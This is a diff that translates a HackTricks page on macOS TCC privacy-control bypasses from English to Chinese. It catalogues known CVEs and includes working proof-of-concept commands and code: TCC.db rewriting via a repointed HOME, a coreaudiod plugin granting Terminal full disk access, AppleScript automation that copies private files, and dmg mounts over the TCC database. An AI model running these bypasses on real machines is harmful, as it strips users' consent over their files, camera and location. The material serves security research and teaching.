@@ -1,25 +1,24 @@
-# macOS TCC Bypasses
+# macOS TCC绕过
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
-## By functionality
+## 按功能分类
 
-### Write Bypass
+### 写入绕过
 
-This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:
-
+这不是一个绕过，这只是TCC的工作原理：**它不会阻止写入操作**。如果终端**无法读取用户的桌面，它仍然可以写入其中**：
 ```shell-session
-username@hostname ~ % ls Desktop 
+username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
 username@hostname ~ % echo asd > Desktop/lalala
 username@hostname ~ % ls Desktop
@@ -27,77 +26,73 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
+**扩展属性`com.apple.macl`**被添加到新的**文件**中，以使**创建者的应用程序**能够访问它。
 
-The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.
+### SSH绕过
 
-### SSH Bypass
-
-By default an access via **SSH** will have **"Full Disk Access"**. In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges):
+默认情况下，通过**SSH**访问将具有**"完全磁盘访问"**权限。为了禁用此权限，您需要将其列出但禁用（从列表中删除不会删除这些权限）：
 
 ![](<../../../../.gitbook/assets/image (569).png>)
 
-Here you can find examples of how some **malwares have been able to bypass this protection**:
+在这里，您可以找到一些**恶意软件如何绕过此保护**的示例：
 
 * [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
 {% hint style="danger" %}
-Note that now, in order to be able to enable SSH you need **Full Disk Access**
+请注意，现在为了能够启用SSH，您需要**完全磁盘访问**权限
 {% endhint %}
 
-### Handle extensions - CVE-2022-26767
+### 处理扩展名 - CVE-2022-26767
 
-The attribute **`com.apple.macl`** is given to files to give a **certain application permissions to read it.** This attribute is set when **drag\&drop** a file over an app, or when a user **double-clicks** a file to open it with the **default application**.
+属性**`com.apple.macl`**被赋予文件以赋予**某个应用程序读取它的权限**。当用户通过**拖放**文件到应用程序上或者双击文件以使用**默认应用程序**打开它时，将设置此属性。
 
-Therefore, a user could **register a malicious app** to handle all the extensions and call Launch Services to **open** any file (so the malicious file will be granted access to read it).
+因此，用户可以**注册一个恶意应用程序**来处理所有扩展名，并调用启动服务来**打开**任何文件（因此恶意文件将被授予读取权限）。
 
 ### iCloud
 
-The entitlement **`com.apple.private.icloud-account-access`** it's possible to communicate with **`com.apple.iCloudHelper`** XPC service which will **provide iCloud tokens**.
+使用权限**`com.apple.private.icloud-account-access`**可以与**`com.apple.iCloudHelper`** XPC服务进行通信，该服务将**提供iCloud令牌**。
 
-**iMovie** and **Garageband** had this entitlement and others that allowed.
+**iMovie**和**Garageband**具有此权限以及其他权限。
 
-For more **information** about the exploit to **get icloud tokens** from that entitlement chec the talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
+有关从该权限中获取iCloud令牌的漏洞的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automation
 
-An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.
+具有**`kTCCServiceAppleEvents`**权限的应用程序将能够**控制其他应用程序**。这意味着它可以滥用授予其他应用程序的权限。
 
-For more info about Apple Scripts check:
+有关Apple脚本的更多信息，请查看：
 
 {% content-ref url="macos-apple-scripts.md" %}
 [macos-apple-scripts.md](macos-apple-scripts.md)
 {% endcontent-ref %}
 
-For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:
+例如，如果一个应用程序具有对`iTerm`的**自动化权限**，例如在此示例中**`Terminal`**具有对iTerm的访问权限：
 
 <figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-#### Over iTerm
+#### 在iTerm上
 
-Terminal, who doesn't have FDA, can call iTerm, which has it, and use it to perform actions:
+没有FDA的Terminal可以调用具有FDA的iTerm，并使用它执行操作：
 
 {% code title="iterm.script" %}
 ```applescript
 tell application "iTerm"
-    activate
-    tell current window
-        create tab with default profile
-    end tell
-    tell current session of current window
-        write text "cp ~/Desktop/private.txt /tmp"
-    end tell
+activate
+tell current window
+create tab with default profile
+end tell
+tell current session of current window
+write text "cp ~/Desktop/private.txt /tmp"
+end tell
 end tell
 ```
 {% endcode %}
-
 ```bash
 osascript iterm.script
 ```
+#### 通过Finder
 
-#### Over Finder
-
-Or if an App has access over Finder, it could a script such as this one:
-
+或者，如果一个应用程序在Finder上具有访问权限，它可以使用以下脚本之一：
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -107,89 +102,83 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
-
-## By App behaviour
+## 通过应用行为
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
 
-The userland **tccd daemon** what using the **`HOME`** **env** variable to access the TCC users database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+用户空间的 **tccd 守护进程** 使用 **`HOME`** **env** 变量来访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
 
-According to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) and because the TCC daemon is running via `launchd` within the current user’s domain, it's possible to **control all environment variables** passed to it.\
-Thus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.\
+根据[这个 Stack Exchange 帖子](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)和因为 TCC 守护进程是通过 `launchd` 在当前用户域中运行的，可以**控制传递给它的所有环境变量**。\
+因此，攻击者可以在 **`launchctl`** 中设置 `$HOME` 环境变量，指向一个**受控的目录**，然后**重新启动** TCC 守护进程，然后直接修改 TCC 数据库，以获取自己所需的**所有 TCC 权限**，而无需提示最终用户。\
 PoC:
-
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
 # mimic TCC's directory structure from ~/Library
 $> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
 # cd into the new directory
-$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"                     
+$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
 # set launchd $HOME to this temporary directory
 $> launchctl setenv HOME /tmp/tccbypass
 # restart the TCC daemon
 $> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
 # print out contents of TCC database and then give Terminal access to Documents
-$> sqlite3 TCC.db .dump                                                               
+$> sqlite3 TCC.db .dump
 $> sqlite3 TCC.db "INSERT INTO access
-                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
-                   'com.apple.Terminal', 0, 1, 1,
+VALUES('kTCCServiceSystemPolicyDocumentsFolder',
+'com.apple.Terminal', 0, 1, 1,
 X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
-                   NULL,
-                   NULL,
-                   'UNUSED',
-                   NULL,
-                   NULL,
-                   1333333333333337);"
+NULL,
+NULL,
+'UNUSED',
+NULL,
+NULL,
+1333333333333337);"
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
+### CVE-2021-30761 - 笔记
 
-### CVE-2021-30761 - Notes
-
-Notes had access to TCC protected locations but when a note is created this is **created in a non-protected location**. So, you could ask notes to copy a protected file in a noe (so in a non-protected location) and then access the file:
+笔记可以访问 TCC 保护的位置，但是当创建笔记时，它会被创建在一个非受保护的位置。因此，你可以要求笔记将受保护的文件复制到一个笔记中（即非受保护的位置），然后访问该文件：
 
 <figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-### CVE-2021-XXXX - Translocation
+### CVE-2021-XXXX - 迁移
 
-The binary `/usr/libexec/lsd` with the library `libsecurity_translocate` had the entitlement `com.apple.private.nullfs_allow` which allowed it to crate **nullfs** mount and had the entitlement `com.apple.private.tcc.allow` with **`kTCCServiceSystemPolicyAllFiles`** to access every file.
+二进制文件 `/usr/libexec/lsd` 与库 `libsecurity_translocate` 具有权限 `com.apple.private.nullfs_allow`，允许其创建 **nullfs** 挂载，并具有权限 `com.apple.private.tcc.allow` 与 **`kTCCServiceSystemPolicyAllFiles`** 以访问所有文件。
 
-It was possible to add the quarantine attribute to "Library", call the **`com.apple.security.translocation`** XPC service and then it would map Library to **`$TMPDIR/AppTranslocation/d/d/Library`** where all the documents inside Library could be **accessed**.
+可以将隔离属性添加到 "Library"，调用 **`com.apple.security.translocation`** XPC 服务，然后它将将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，从而可以访问 Library 中的所有文档。
 
-### SQL Tracing
+### SQL 跟踪
 
-If the environment variable **`SQLITE_AUTO_TRACE`** is set, the library **`libsqlite3.dylib`** will start **logging** all the SQL queries. Many applications used this library, so it was possible to log all their SQLite queries.
+如果环境变量 **`SQLITE_AUTO_TRACE`** 被设置，库 **`libsqlite3.dylib`** 将开始记录所有的 SQL 查询。许多应用程序使用此库，因此可以记录它们的所有 SQLite 查询。
 
-Several Apple applications used this library to access TCC protected information.
-
+几个 Apple 应用程序使用此库来访问 TCC 保护的信息。
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
+### Apple远程桌面
 
-### Apple Remote Dektop
+作为root用户，您可以启用此服务，并且ARD代理将具有完全磁盘访问权限，用户可以滥用此权限使其复制新的TCC用户数据库。
 
-As root you could enable this service and the **ARD agent will have full disk access** which could then be abused by a user to make it copy a new **TCC user database**.
+## 通过插件
 
-## By plugins
+插件是额外的代码，通常以库或plist的形式存在，它们将由主应用程序加载并在其上下文中执行。因此，如果主应用程序可以访问TCC受限文件（通过授予权限或授予的权限），则自定义代码也将具有相同的访问权限。
 
-Plugins are extra code usually in the form of libraries or plist, that will be **loaded by the main applicatio**n and will execute under its context. Therefore, if the main application had access to TCC restricted files (via granted permissions or entitlements), the **custom code will also have it**.
+### CVE-2020-27937 - 目录实用工具
 
-### CVE-2020-27937 - Directory Utility
+应用程序`/System/Library/CoreServices/Applications/Directory Utility.app`具有权限`kTCCServiceSystemPolicySysAdminFiles`，加载了扩展名为`.daplug`的插件，并且没有启用强化运行时。
 
-The application `/System/Library/CoreServices/Applications/Directory Utility.app` had the entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, loaded plugins with **`.daplug`** extension and **didn't have the hardened** runtime.
+为了利用此CVE，滥用先前的权限，将`NFSHomeDirectory`更改为能够接管用户的TCC数据库以绕过TCC。
 
-In order to weaponize this CVE, the **`NFSHomeDirectory`** is **changed** (abusing the previous entitlement) in order to be able to **take over the users TCC databas**e to bypass TCC.
-
-For more info check the [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
+有关更多信息，请查看[原始报告](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。
 
 ### CVE-2020-29621 - Coreaudiod
 
-The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.
+二进制文件`/usr/sbin/coreaudiod`具有权限`com.apple.security.cs.disable-library-validation`和`com.apple.private.tcc.manager`。第一个权限允许代码注入，第二个权限允许其管理TCC。
 
-This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:
-
+该二进制文件允许从文件夹`/Library/Audio/Plug-Ins/HAL`加载第三方插件。因此，可以使用此PoC加载插件并滥用TCC权限：
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -197,39 +186,38 @@ This binary allowed to load **third party plug-ins** from the folder `/Library/A
 extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);
 
 void add_tcc_entry() {
-    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
-    
-    CFStringRef bundleID = CFSTR("com.apple.Terminal");
-    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
-    SecRequirementRef requirement = NULL;
-    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
-    CFDataRef requirementData = NULL;
-    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
-    
-    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
+CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
+
+CFStringRef bundleID = CFSTR("com.apple.Terminal");
+CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
+SecRequirementRef requirement = NULL;
+SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
+CFDataRef requirementData = NULL;
+SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
+
+TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
 }
 
 __attribute__((constructor)) static void constructor(int argc, const char **argv) {
-    
-    add_tcc_entry();
-    
-    NSLog(@"[+] Exploitation finished...");
-    exit(0);
+
+add_tcc_entry();
+
+NSLog(@"[+] Exploitation finished...");
+exit(0);
 ```
+有关更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。
 
-For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
+### 设备抽象层（DAL）插件
 
-### Device Abstraction Layer (DAL) Plug-Ins
+通过Core Media I/O打开相机流的系统应用程序（具有**`kTCCServiceCamera`**的应用程序）会在进程中加载位于`/Library/CoreMediaIO/Plug-Ins/DAL`中的这些插件（不受SIP限制）。
 
-System applications that open camera stream via Core Media I/O (apps with **`kTCCServiceCamera`**) load **in the process these plugins** located in `/Library/CoreMediaIO/Plug-Ins/DAL` (not SIP restricted).
+只需在其中存储一个具有常见**构造函数**的库即可用于**注入代码**。
 
-Just storing in there a library with the common **constructor** will work to **inject code**.
+几个Apple应用程序存在此漏洞。
 
-Several Apple applications were vulnerable to this.
+## 通过进程注入
 
-## By process injection
-
-There are different techniques to inject code inside a process and abuse its TCC privileges:
+有不同的技术可以在进程内注入代码并滥用其TCC权限：
 
 {% content-ref url="../../macos-proces-abuse/" %}
 [macos-proces-abuse](../../macos-proces-abuse/)
@@ -237,8 +225,7 @@ There are different techniques to inject code inside a process and abuse its TCC
 
 ### Firefox
 
-The Firefox application is still vulnerable having the `com.apple.security.cs.disable-library-validation` entitlement:
-
+Firefox应用程序仍然存在漏洞，具有`com.apple.security.cs.disable-library-validation`权限：
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -247,62 +234,58 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
-    <true/>
-    <key>com.apple.security.cs.disable-library-validation</key>
-    <true/>
-    <key>com.apple.security.device.audio-input</key>
-    <true/>
-    <key>com.apple.security.device.camera</key>
-    <true/>
-    <key>com.apple.security.personal-information.location</key>
-    <true/>
-    <key>com.apple.security.smartcard</key>
-    <true/>
+<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
+<true/>
+<key>com.apple.security.cs.disable-library-validation</key>
+<true/>
+<key>com.apple.security.device.audio-input</key>
+<true/>
+<key>com.apple.security.device.camera</key>
+<true/>
+<key>com.apple.security.personal-information.location</key>
+<true/>
+<key>com.apple.security.smartcard</key>
+<true/>
 </dict>
 </plist>
 ```
-
-Fore more info about how to easily exploit this [**check the original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
+有关如何轻松利用此漏洞的更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。
 
 ### CVE-2020-10006
 
-The binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` had the entitlements **`com.apple.private.tcc.allow`** and **`com.apple.security.get-task-allow`**, which allowed to inject code inside the process and use the TCC privileges.
+二进制文件`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`具有权限**`com.apple.private.tcc.allow`**和**`com.apple.security.get-task-allow`**，允许在进程内注入代码并使用TCC权限。
 
 ### CVE-2023-26818 - Telegram
 
-Telegram had the entitlements `com.apple.security.cs.allow-dyld-environment-variables` and c`om.apple.security.cs.disable-library-validation`, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
+Telegram具有权限`com.apple.security.cs.allow-dyld-environment-variables`和`com.apple.security.cs.disable-library-validation`，因此可以滥用它以获取其权限，例如使用摄像头进行录制。您可以在[**写作中找到有效载荷**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。
 
-## By open invocations
+## 通过打开调用
 
-It's possible to invoke open in sandboxed&#x20;
+可以在受沙盒限制的环境中调用打开。
 
-### Terminal Scripts
+### 终端脚本
 
-It's quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it's possible to invoke **`.terminal`** scripts using with it.
+通常会为终端授予**完全磁盘访问权限（FDA）**，至少在技术人员使用的计算机上是如此。可以使用它来调用**`.terminal`**脚本。
 
-**`.terminal`** scripts are plist files such as this one with the command to execute in the **`CommandString`** key:
-
+**`.terminal`**脚本是plist文件，其中包含要在**`CommandString`**键中执行的命令：
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
-    <key>CommandString</key>
-    <string>cp ~/Desktop/private.txt /tmp/;</string>
-    <key>ProfileCurrentVersion</key>
-    <real>2.0600000000000001</real>
-    <key>RunCommandAsShell</key>
-    <false/>
-    <key>name</key>
-    <string>exploit</string>
-    <key>type</key>
-    <string>Window Settings</string>
+<key>CommandString</key>
+<string>cp ~/Desktop/private.txt /tmp/;</string>
+<key>ProfileCurrentVersion</key>
+<real>2.0600000000000001</real>
+<key>RunCommandAsShell</key>
+<false/>
+<key>name</key>
+<string>exploit</string>
+<key>type</key>
+<string>Window Settings</string>
 </dict>
 </plist>
 ```
-
-An application could write a terminal script in a location such as /tmp and launch it with a come such as:
-
+应用程序可以在/tmp等位置编写一个终端脚本，并使用如下命令启动它：
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -313,13 +296,12 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
+## 通过挂载
 
-## By mounting
+### CVE-2020-9771 - mount\_apfs TCC绕过和权限提升
 
-### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation
-
-**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
-The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.
+**任何用户**（即使是非特权用户）都可以创建和挂载时间机器快照，并**访问该快照的所有文件**。\
+唯一需要的特权是所使用的应用程序（如`Terminal`）需要具有**完全磁盘访问权限**（FDA）（`kTCCServiceSystemPolicyAllfiles`），这需要由管理员授予。
 
 {% code overflow="wrap" %}
 ```bash
@@ -343,11 +325,11 @@ ls /tmp/snap/Users/admin_user # This will work
 ```
 {% endcode %}
 
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
+更详细的解释可以在[原始报告中找到](https://theevilbit.github.io/posts/cve\_2020\_9771/)。
 
-### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file
+### CVE-2021-1784和CVE-2021-30808 - 在TCC文件上挂载
 
-Even if TCC DB file is protected, It was possible to **mount over the directory** a new TCC.db file:
+即使TCC DB文件受到保护，仍然可以在目录上**挂载一个新的TCC.db文件**：
 
 {% code overflow="wrap" %}
 ```bash
@@ -360,42 +342,40 @@ hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TC
 hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
 ```
 {% endcode %}
-
 ```python
 # This was the python function to create the dmg
 def create_dmg():
-	os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
-	os.system("mkdir /tmp/mnt")
-	os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
-	os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
-	os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
-	os.system("hdiutil detach /tmp/mnt 1>/dev/null")
+os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
+os.system("mkdir /tmp/mnt")
+os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
+os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
+os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
+os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
-
-Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).
+查看[原始文档](https://theevilbit.github.io/posts/cve-2021-30808/)中的**完整利用**。
 
 ### asr
 
-The tool **`/usr/sbin/asr`** allowed to copy the whole disk and mount it in another place bypassing TCC protections.
+工具**`/usr/sbin/asr`**允许复制整个磁盘并将其挂载到另一个位置，绕过TCC保护。
 
-### Location Services
+### 位置服务
 
-There is a third TCC database in **`/var/db/locationd/clients.plist`** to indicate clients allowed to **access location services**.\
-The folder **`/var/db/locationd/` wasn't protected from DMG mounting** so it was possible to mount our own plist.
+在**`/var/db/locationd/clients.plist`**中有第三个TCC数据库，用于指示允许**访问位置服务**的客户端。\
+文件夹**`/var/db/locationd/`没有受到DMG挂载的保护**，因此可以挂载我们自己的plist。
 
-## By startup apps
+## 通过启动应用程序
 
 {% content-ref url="../../../macos-auto-start-locations.md" %}
 [macos-auto-start-locations.md](../../../macos-auto-start-locations.md)
 {% endcontent-ref %}
 
-## By grep
+## 通过grep
 
-In several occasions files will store sensitive information like emails, phone numbers, messages... in non protected locations (which count as a vulnerability in Apple).
+在许多情况下，文件会将敏感信息（如电子邮件、电话号码、消息等）存储在未受保护的位置（这在Apple中被视为漏洞）。
 
 <figure><img src="../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
-## Reference
+## 参考
 
 * [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
 * [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
@@ -406,10 +386,10 @@ In several occasions files will store sensitive information like emails, phone n
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
